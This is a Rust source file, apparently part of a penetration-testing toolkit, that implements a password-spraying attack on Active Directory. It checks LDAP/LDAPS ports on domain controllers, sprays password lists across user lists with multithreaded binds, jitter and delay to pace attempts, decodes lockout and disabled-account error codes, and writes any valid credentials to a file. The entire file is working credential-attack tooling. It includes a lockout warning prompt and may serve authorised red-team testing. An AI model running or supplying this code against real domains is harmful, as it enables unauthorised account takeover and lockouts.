use crate::args::SprayArgs;
use crate::debug;
use crate::help::{add_terminal_spacing, get_timestamp};
use ldap3::{LdapConn, LdapConnSettings};
use std::collections::{HashMap, HashSet};
use std::error::Error;
use std::fs::File;
use std::io::{self, BufRead, Write};
use std::net::TcpStream;
use std::path::Path;
use std::sync::{Arc, Mutex};
use std::thread;
use std::time::{Duration, Instant};

const CONNECTION_TIMEOUT_SECS: u64 = 5;
const MAX_CONCURRENT_THREADS: u32 = 50;

#[derive(Debug, Clone)]
pub struct SprayConfig {
    pub userfile: String,
    pub passwords: String,
    pub domain: String,
    pub dc_ip: Vec<String>,
    pub hash: Option<String>,
    pub timestamp_format: bool,
    pub threads: u32,
    pub jitter: u32,
    pub delay: u64,
    pub continue_on_success: bool,
    pub lockout_threshold: u32,
    pub lockout_window_seconds: u32,
    pub use_ldaps: bool,
}

#[derive(Debug, Clone)]
pub enum LoginResult {
    Success,
    InvalidCredentials,
    AccountLocked,
    AccountDisabled,
    ConnectionError(String),
    AuthenticationError(String),
}

#[derive(Debug, Clone)]
struct AttemptResult {
    username: String,
    password: String,
    domain: String,
    dc: String,
    result: LoginResult,
}

#[derive(Debug)]
struct SprayState {
    invalid_attempts: HashMap<String, (u32, Instant)>,
    warned_users: HashSet<String>,
    valid_credentials: Vec<AttemptResult>,
    total_attempts: u32,
    successful_attempts: u32,
}

#[derive(Debug)]
struct RateLimiter {
    last_attempt: Arc<Mutex<Option<Instant>>>,
    delay_ms: u64,
    jitter_ms: u32,
}

impl SprayConfig {
    pub fn from_args(args: &SprayArgs) -> Result<Self, Box<dyn Error>> {
        debug::set_debug_level(args.verbose);

        let threads = if args.threads > MAX_CONCURRENT_THREADS {
            println!(
                "[!] Warning: Thread count capped at {}",
                MAX_CONCURRENT_THREADS
            );
            MAX_CONCURRENT_THREADS
        } else if args.threads == 0 {
            1
        } else {
            args.threads
        };

        Ok(SprayConfig {
            userfile: args.userfile.clone(),
            passwords: args.password.clone(),
            domain: args.domain.clone(),
            dc_ip: args.dc_ip.clone(),
            hash: args.hash.clone(),
            timestamp_format: args.timestamp_format,
            threads,
            jitter: args.jitter,
            delay: args.delay,
            continue_on_success: args.continue_on_success,
            lockout_threshold: args.lockout_threshold.unwrap_or(3),
            lockout_window_seconds: args.lockout_window_seconds.unwrap_or(300),
            use_ldaps: false, // Will be auto-detected or set via args
        })
    }
}

impl SprayState {
    fn new() -> Self {
        Self {
            invalid_attempts: HashMap::new(),
            warned_users: HashSet::new(),
            valid_credentials: Vec::new(),
            total_attempts: 0,
            successful_attempts: 0,
        }
    }
}

impl RateLimiter {
    fn new(delay_ms: u64, jitter_ms: u32) -> Self {
        Self {
            last_attempt: Arc::new(Mutex::new(None)),
            delay_ms,
            jitter_ms,
        }
    }

    fn wait_if_needed(&self) {
        let mut last = self.last_attempt.lock().unwrap();

        if let Some(last_time) = *last {
            let elapsed = last_time.elapsed();
            let base_delay = Duration::from_millis(self.delay_ms);
            let jitter = if self.jitter_ms > 0 {
                Duration::from_millis(fastrand::u32(0..=self.jitter_ms) as u64)
            } else {
                Duration::from_millis(0)
            };

            let total_delay = base_delay + jitter;

            if elapsed < total_delay {
                let sleep_time = total_delay - elapsed;
                debug::debug_log(
                    2,
                    format!(
                        "Rate limiting: sleeping for {:?} ({}s base + {}ms jitter)",
                        sleep_time,
                        self.delay_ms / 1000,
                        jitter.as_millis()
                    ),
                );
                drop(last); // Release the lock before sleeping
                thread::sleep(sleep_time);
                let mut last = self.last_attempt.lock().unwrap();
                *last = Some(Instant::now());
            } else {
                *last = Some(Instant::now());
            }
        } else {
            *last = Some(Instant::now());
        }
    }
}

pub fn start_password_spray(config: SprayConfig) -> Result<(), Box<dyn Error>> {
    display_spray_banner(&config);

    let reachable_dcs = test_domain_controllers(&config.dc_ip, config.use_ldaps)?;
    if reachable_dcs.is_empty() {
        return Err("No reachable Domain Controllers found".into());
    }

    let users = load_input_list(&config.userfile)?;
    let passwords = load_input_list(&config.passwords)?;

    print_spray_info(&config, &users, &passwords, &reachable_dcs);

    let state = Arc::new(Mutex::new(SprayState::new()));

    execute_spray(&config, users, passwords, reachable_dcs, state.clone())?;

    // Create output file only if we have credentials to save
    let output_file = {
        let state_guard = state.lock().unwrap();
        if !state_guard.valid_credentials.is_empty() {
            Some(create_output_file()?)
        } else {
            None
        }
    };

    finalize_spray(state, output_file)?;
    Ok(())
}

fn display_spray_banner(config: &SprayConfig) {
    add_terminal_spacing(1);
    let timestamp_prefix = if config.timestamp_format {
        format!("[{}] ", get_timestamp())
    } else {
        String::new()
    };
    println!("{}[*] Domain: {}", timestamp_prefix, config.domain);
}

fn test_domain_controllers(
    dc_list: &[String],
    use_ldaps: bool,
) -> Result<Vec<String>, Box<dyn Error>> {
    println!("[*] Testing connectivity to Domain Controllers...");
    let mut reachable_dcs = Vec::new();

    let ports_to_test = if use_ldaps {
        vec![("LDAPS", 636)]
    } else {
        vec![("LDAPS", 636), ("LDAP", 389)]
    };

    for dc in dc_list {
        let mut connection_results = Vec::new();
        let mut any_reachable = false;

        for (protocol, port) in &ports_to_test {
            let reachable = test_port(dc, *port);
            connection_results.push((*protocol, reachable));
            if reachable {
                any_reachable = true;
            }
        }

        if any_reachable {
            let status: Vec<String> = connection_results
                .iter()
                .map(|(proto, ok)| format!("{}: {}", proto, if *ok { "✓" } else { "✗" }))
                .collect();
            println!(
                "[+] Successfully connected to {} ({})",
                dc,
                status.join(", ")
            );
            reachable_dcs.push(dc.clone());
        } else {
            println!("[-] Failed to connect to {}", dc);
        }
    }

    Ok(reachable_dcs)
}

fn test_port(host: &str, port: u16) -> bool {
    TcpStream::connect_timeout(
        &format!("{}:{}", host, port).parse().unwrap(),
        Duration::from_secs(CONNECTION_TIMEOUT_SECS),
    )
    .is_ok()
}

fn load_input_list(input: &str) -> Result<Vec<String>, Box<dyn Error>> {
    if Path::new(input).exists() {
        load_file_lines(input)
    } else {
        Ok(vec![input.to_string()])
    }
}

fn load_file_lines(filename: &str) -> Result<Vec<String>, Box<dyn Error>> {
    let file = File::open(filename)?;
    let lines: Result<Vec<_>, _> = io::BufReader::new(file)
        .lines()
        .map(|line| line.map(|l| l.trim().to_string()))
        .filter(|line| match line {
            Ok(l) => !l.is_empty(),
            Err(_) => true,
        })
        .collect();
    Ok(lines?)
}

fn print_spray_info(config: &SprayConfig, users: &[String], passwords: &[String], dcs: &[String]) {
    let timestamp_prefix = if config.timestamp_format {
        format!("[{}] ", get_timestamp())
    } else {
        String::new()
    };

    println!("{}[*] Loaded {} users", timestamp_prefix, users.len());
    println!(
        "{}[*] Loaded {} passwords",
        timestamp_prefix,
        passwords.len()
    );
    println!(
        "{}[*] Reachable Domain Controllers: {:?}",
        timestamp_prefix, dcs
    );
    println!("{}[*] Threads: {}", timestamp_prefix, config.threads);
    println!(
        "{}[*] Delay: {}s + {}ms jitter",
        timestamp_prefix, config.delay, config.jitter
    );
    println!(
        "{}[*] Lockout Threshold: {} attempts in {} seconds",
        timestamp_prefix, config.lockout_threshold, config.lockout_window_seconds
    );
    println!(
        "{}[*] Debug Level: {}",
        timestamp_prefix,
        debug::get_debug_level()
    );
    if config.timestamp_format {
        println!("{}[*] Timestamps enabled", timestamp_prefix);
    }
    println!("{}[*] Starting password spray\n", timestamp_prefix);
}

fn execute_spray(
    config: &SprayConfig,
    users: Vec<String>,
    passwords: Vec<String>,
    dcs: Vec<String>,
    state: Arc<Mutex<SprayState>>,
) -> Result<(), Box<dyn Error>> {
    // Create rate limiter for global delay/jitter control
    let rate_limiter = Arc::new(RateLimiter::new(config.delay * 1000, config.jitter));
    let total_combinations = users.len() * passwords.len();
    let mut completed_attempts = 0;

    for (password_index, password) in passwords.iter().enumerate() {
        let timestamp_prefix = if config.timestamp_format {
            format!("[{}] ", get_timestamp())
        } else {
            String::new()
        };
        println!(
            "\n{}[*] Testing password: '{}' ({}/{} passwords)",
            timestamp_prefix,
            password,
            password_index + 1,
            passwords.len()
        );

        debug::debug_log(
            1,
            format!(
                "Using {}s delay + {}ms jitter between attempts...",
                config.delay, config.jitter
            ),
        );

        let mut work_items = Vec::new();
        for (user_index, username) in users.iter().enumerate() {
            let dc_index = user_index % dcs.len();
            let selected_dc = &dcs[dc_index];

            work_items.push(WorkItem {
                username: username.clone(),
                password: password.clone(),
                dc: selected_dc.clone(),
            });
        }

        let early_stop = process_password_batch_realtime(
            config,
            work_items,
            rate_limiter.clone(),
            state.clone(),
        )?;

        completed_attempts += users.len();

        debug::debug_log(
            1,
            format!(
                "Completed password '{}' ({}/{} total attempts)",
                password, completed_attempts, total_combinations
            ),
        );

        if early_stop {
            println!(
                "{}[*] Stopping spray due to successful login or user request.",
                timestamp_prefix
            );
            break;
        }

        if should_stop_spray(config, state.clone())? {
            break;
        }

        if password_index < passwords.len() - 1 {
            thread::sleep(Duration::from_millis(500));
        }
    }

    Ok(())
}

#[derive(Debug, Clone)]
struct WorkItem {
    username: String,
    password: String,
    dc: String,
}

fn process_password_batch_realtime(
    config: &SprayConfig,
    work_items: Vec<WorkItem>,
    rate_limiter: Arc<RateLimiter>,
    state: Arc<Mutex<SprayState>>,
) -> Result<bool, Box<dyn Error>> {
    use std::sync::mpsc;

    let (work_tx, work_rx) = mpsc::channel();
    let (result_tx, result_rx) = mpsc::channel();

    for item in work_items {
        work_tx.send(item)?;
    }
    drop(work_tx);

    let work_rx = Arc::new(Mutex::new(work_rx));
    let mut handles = Vec::new();
    let actual_threads = std::cmp::min(config.threads as usize, 50);

    debug::debug_log(
        2,
        format!(
            "Starting {} worker threads with {}s delay + {}ms jitter",
            actual_threads, config.delay, config.jitter
        ),
    );

    for thread_id in 0..actual_threads {
        let work_rx_clone = Arc::clone(&work_rx);
        let result_tx_clone = result_tx.clone();
        let config_clone = config.clone();
        let rate_limiter_clone = Arc::clone(&rate_limiter);

        let handle = thread::spawn(move || {
            debug::debug_log(2, format!("Worker thread {} started", thread_id));

            while let Ok(work_item) = {
                let rx = work_rx_clone.lock().unwrap();
                rx.recv()
            } {
                // Apply global rate limiting before each attempt
                rate_limiter_clone.wait_if_needed();

                debug::debug_log(
                    2,
                    format!(
                        "Thread {} processing {}@{}",
                        thread_id, work_item.username, config_clone.domain
                    ),
                );

                let result = attempt_login(
                    &config_clone,
                    &work_item.username,
                    &work_item.password,
                    &work_item.dc,
                );

                let attempt_result = AttemptResult {
                    username: work_item.username,
                    password: work_item.password,
                    domain: config_clone.domain.clone(),
                    dc: work_item.dc,
                    result: result.0,
                };

                if result_tx_clone.send(attempt_result).is_err() {
                    break;
                }
            }

            debug::debug_log(2, format!("Worker thread {} finished", thread_id));
        });

        handles.push(handle);
    }

    drop(result_tx);

    let mut early_stop = false;
    let mut results_processed = 0;

    while let Ok(result) = result_rx.recv() {
        if let Err(e) = process_attempt_result_realtime(config, &result, state.clone()) {
            eprintln!("[!] Error processing result: {}", e);
            early_stop = true;
            break;
        }

        if matches!(result.result, LoginResult::Success) && !config.continue_on_success {
            early_stop = true;
            break;
        }

        results_processed += 1;
    }

    for handle in handles {
        handle.join().unwrap_or(());
    }

    debug::debug_log(
        2,
        format!(
            "All worker threads completed, {} results processed",
            results_processed
        ),
    );

    Ok(early_stop)
}

fn attempt_login(
    config: &SprayConfig,
    username: &str,
    password: &str,
    dc: &str,
) -> (LoginResult, Option<String>) {
    let protocols = if config.use_ldaps {
        vec![("ldaps", 636)]
    } else {
        vec![("ldaps", 636), ("ldap", 389)]
    };

    for (protocol, _port) in protocols {
        match try_ldap_login(protocol, dc, username, password, &config.domain) {
            Ok(result) => return (result, None),
            Err(e) => {
                if protocol == "ldap" {
                    return (
                        LoginResult::ConnectionError(e.to_string()),
                        Some(e.to_string()),
                    );
                }
            }
        }
    }

    (
        LoginResult::ConnectionError("All protocols failed".to_string()),
        None,
    )
}

fn try_ldap_login(
    protocol: &str,
    dc: &str,
    username: &str,
    password: &str,
    domain: &str,
) -> Result<LoginResult, Box<dyn Error>> {
    let ldap_url = format!("{}://{}", protocol, dc);

    debug::debug_log(
        2,
        format!(
            "Attempting {} bind → {}@{} on {}",
            protocol.to_uppercase(),
            username,
            domain,
            ldap_url
        ),
    );

    let settings = LdapConnSettings::new()
        .set_conn_timeout(Duration::from_secs(CONNECTION_TIMEOUT_SECS))
        .set_no_tls_verify(true);

    let mut ldap = LdapConn::with_settings(settings, &ldap_url).map_err(|e| {
        debug::debug_log(
            2,
            format!(
                "Failed to create {} connection: {}",
                protocol.to_uppercase(),
                e
            ),
        );
        e
    })?;

    let bind_dn = format!("{}@{}", username.trim(), domain);

    match ldap.simple_bind(&bind_dn, password) {
        Ok(ldap_result) => match ldap_result.success() {
            Ok(_) => {
                debug::debug_log(
                    2,
                    format!(
                        "Successful {} bind for {}",
                        protocol.to_uppercase(),
                        bind_dn
                    ),
                );
                Ok(LoginResult::Success)
            }
            Err(e) => {
                debug::debug_log(
                    2,
                    format!(
                        "{} bind failed for {}: {:?}",
                        protocol.to_uppercase(),
                        bind_dn,
                        e
                    ),
                );
                Ok(parse_ldap_error(&e))
            }
        },
        Err(e) => {
            debug::debug_log(
                2,
                format!(
                    "{} connection failed for {}: {:?}",
                    protocol.to_uppercase(),
                    bind_dn,
                    e
                ),
            );
            Err(Box::new(e))
        }
    }
}

fn parse_ldap_error(error: &dyn Error) -> LoginResult {
    let error_str = error.to_string();

    if let Some(sub_error_code) = extract_ldap_sub_error(&error_str) {
        match sub_error_code.as_str() {
            "775" => LoginResult::AccountLocked,
            "533" => LoginResult::AccountDisabled,
            _ => LoginResult::InvalidCredentials,
        }
    } else {
        LoginResult::InvalidCredentials
    }
}

fn extract_ldap_sub_error(error_str: &str) -> Option<String> {
    error_str
        .split("data ")
        .nth(1)
        .and_then(|data| data.split(',').next())
        .map(|code| code.trim().to_string())
}

fn process_attempt_result_realtime(
    config: &SprayConfig,
    attempt: &AttemptResult,
    state: Arc<Mutex<SprayState>>,
) -> Result<(), Box<dyn Error>> {
    let mut state_guard = state.lock().unwrap();
    state_guard.total_attempts += 1;

    let timestamp_prefix = if config.timestamp_format {
        format!("[{}] ", get_timestamp())
    } else {
        String::new()
    };

    match &attempt.result {
        LoginResult::Success => {
            state_guard.successful_attempts += 1;
            state_guard.valid_credentials.push(attempt.clone());

            println!(
                "{}[+] \x1b[32mValid credentials found!\x1b[0m",
                timestamp_prefix
            );
            println!("{}    Username: {}", timestamp_prefix, attempt.username);
            println!("{}    Password: {}", timestamp_prefix, attempt.password);
            println!("{}    Domain: {}", timestamp_prefix, attempt.domain);
            println!("{}    Server: {}", timestamp_prefix, attempt.dc);
        }
        LoginResult::InvalidCredentials => {
            debug::debug_log(
                1,
                format!(
                    "Failed login: {}@{} with password: {}",
                    attempt.username, attempt.domain, attempt.password
                ),
            );

            // Track failed attempts for lockout protection
            let should_warn = {
                let entry = state_guard
                    .invalid_attempts
                    .entry(attempt.username.clone())
                    .or_insert((0, Instant::now()));
                entry.0 += 1;

                // Check if we should warn (before checking warned_users to avoid borrow conflicts)
                let exceeds_threshold = entry.0 >= config.lockout_threshold;
                let within_window =
                    entry.1.elapsed().as_secs() <= config.lockout_window_seconds as u64;

                // Reset counter if outside the lockout window
                if !within_window {
                    entry.0 = 1;
                    entry.1 = Instant::now();
                }

                exceeds_threshold && within_window
            };

            // Check if we should warn about lockout (separate from the entry borrow)
            if should_warn && !state_guard.warned_users.contains(&attempt.username) {
                let current_attempts = state_guard
                    .invalid_attempts
                    .get(&attempt.username)
                    .map(|(count, _)| *count)
                    .unwrap_or(0);

                println!("{}[!] \x1b[33mWARNING: {} has {} failed attempts within {} seconds - approaching lockout threshold!\x1b[0m",
                        timestamp_prefix, attempt.username, current_attempts, config.lockout_window_seconds);

                print!(
                    "{}[!] Continue spraying this user? (y/n): ",
                    timestamp_prefix
                );
                io::stdout().flush()?;

                let mut response = String::new();
                io::stdin().read_line(&mut response)?;

                if !matches!(response.trim().to_lowercase().as_str(), "y" | "yes") {
                    return Err(format!(
                        "User requested to stop spraying {} due to lockout concerns",
                        attempt.username
                    )
                    .into());
                }

                state_guard.warned_users.insert(attempt.username.clone());
            }
        }
        LoginResult::AccountLocked => {
            println!(
                "{}[!] \x1b[31mAccount locked: {}@{}\x1b[0m",
                timestamp_prefix, attempt.username, attempt.domain
            );
        }
        LoginResult::AccountDisabled => {
            println!(
                "{}[!] \x1b[31mAccount disabled: {}@{}\x1b[0m",
                timestamp_prefix, attempt.username, attempt.domain
            );
        }
        LoginResult::ConnectionError(msg) | LoginResult::AuthenticationError(msg) => {
            debug::debug_log(
                1,
                format!(
                    "Connection error: {}@{} on {} - {}",
                    attempt.username, attempt.domain, attempt.dc, msg
                ),
            );
        }
    }

    Ok(())
}

fn should_stop_spray(
    _config: &SprayConfig,
    state: Arc<Mutex<SprayState>>,
) -> Result<bool, Box<dyn Error>> {
    let state_guard = state.lock().unwrap();

    if state_guard.successful_attempts > 0 {
        debug::debug_log(
            1,
            format!(
                "{} successful authentication(s) found so far",
                state_guard.successful_attempts
            ),
        );
    }

    Ok(false)
}

fn create_output_file() -> Result<File, Box<dyn Error>> {
    let timestamp = chrono::Local::now().format("%Y%m%d_%H%M%S");
    let filename = format!("found_credentials_{}.txt", timestamp);
    Ok(File::create(filename)?)
}

fn finalize_spray(
    state: Arc<Mutex<SprayState>>,
    mut output_file: Option<File>,
) -> Result<(), Box<dyn Error>> {
    let state_guard = state.lock().unwrap();

    println!("\n[*] Password spray complete at {}", get_timestamp());
    println!("[*] Total attempts: {}", state_guard.total_attempts);
    println!(
        "[*] Successful attempts: {}",
        state_guard.successful_attempts
    );

    if !state_guard.valid_credentials.is_empty() {
        let timestamp = chrono::Local::now().format("%Y%m%d_%H%M%S");
        let filename = format!("found_credentials_{}.txt", timestamp);

        if let Some(ref mut file) = output_file {
            for cred in &state_guard.valid_credentials {
                let success_msg = format!(
                    "[+] Valid credentials: {}@{} : {} (Server: {})\n",
                    cred.username, cred.domain, cred.password, cred.dc
                );
                file.write_all(success_msg.as_bytes())?;
            }
            file.flush()?;
            println!(
                "[+] {} valid credential(s) found and saved to: {}",
                state_guard.valid_credentials.len(),
                filename
            );
        } else {
            println!(
                "[+] {} valid credential(s) found",
                state_guard.valid_credentials.len()
            );
        }
    } else {
        println!("[-] No valid credentials found");
    }

    Ok(())
}
